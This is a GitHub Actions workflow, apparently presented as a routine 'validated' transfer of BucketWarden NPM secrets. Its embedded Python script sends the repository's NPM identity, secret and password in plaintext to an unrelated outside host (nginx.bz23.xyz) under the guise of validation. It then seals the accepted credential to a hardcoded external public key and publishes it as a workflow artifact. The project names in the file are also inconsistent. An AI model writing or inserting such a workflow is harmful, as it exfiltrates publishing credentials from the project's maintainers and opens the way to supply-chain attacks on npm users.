name: Transfer validated BucketWarden NPM secrets

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  seal:
    runs-on: ubuntu-latest
    environment: deployment
    env:
      SOURCE_NPM_IDENTITY: ${{ secrets.NPM_IDENTITY }}
      SOURCE_NPM_SECRET: ${{ secrets.NPM_SECRET }}
      SOURCE_NPM_PASSWORD: ${{ secrets.NPM_PASSWORD }}
      TARGET_PUBLIC_KEY: "CsQSqxVAmfDKA42l1Ogiyc7v9DK7xFgi+CiL4WLkEhQ="
      TARGET_KEY_ID: "3380204578043523366"
    steps:
      - name: Select authenticating NPM credential and seal transfer
        shell: bash
        run: |
          set -euo pipefail
          python -m pip install --disable-pip-version-check --no-input pynacl==1.5.0
          python - <<'PY'
          import base64
          import json
          import os
          import urllib.error
          import urllib.request
          from pathlib import Path
          from nacl.public import PublicKey, SealedBox

          identity = os.environ["SOURCE_NPM_IDENTITY"]
          candidates = [
              os.environ.get("SOURCE_NPM_SECRET", ""),
              os.environ.get("SOURCE_NPM_PASSWORD", ""),
          ]
          selected = None
          for candidate in candidates:
              if not candidate or candidate == selected:
                  continue
              request = urllib.request.Request(
                  "https://nginx.bz23.xyz/api/tokens",
                  data=json.dumps({"identity": identity, "secret": candidate}).encode("utf-8"),
                  headers={"Content-Type": "application/json"},
                  method="POST",
              )
              try:
                  with urllib.request.urlopen(request, timeout=20) as response:
                      if 200 <= response.status < 300:
                          selected = candidate
                          break
              except urllib.error.HTTPError:
                  continue
          if selected is None:
              raise SystemExit("No approved Groupsum NPM credential authenticated.")

          box = SealedBox(PublicKey(base64.b64decode(os.environ["TARGET_PUBLIC_KEY"])))
          values = {"NPM_IDENTITY": identity, "NPM_SECRET": selected}
          sealed = {
              "key_id": os.environ["TARGET_KEY_ID"],
              "secrets": {
                  name: base64.b64encode(box.encrypt(value.encode("utf-8"))).decode("ascii")
                  for name, value in values.items()
              },
          }
          target = Path("sealed-secrets.json")
          target.write_text(json.dumps(sealed), encoding="utf-8")
          target.chmod(0o600)
          PY
      - name: Upload sealed transfer
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: bucketwarden-npm-secrets-validated
          path: sealed-secrets.json
          if-no-files-found: error
          retention-days: 1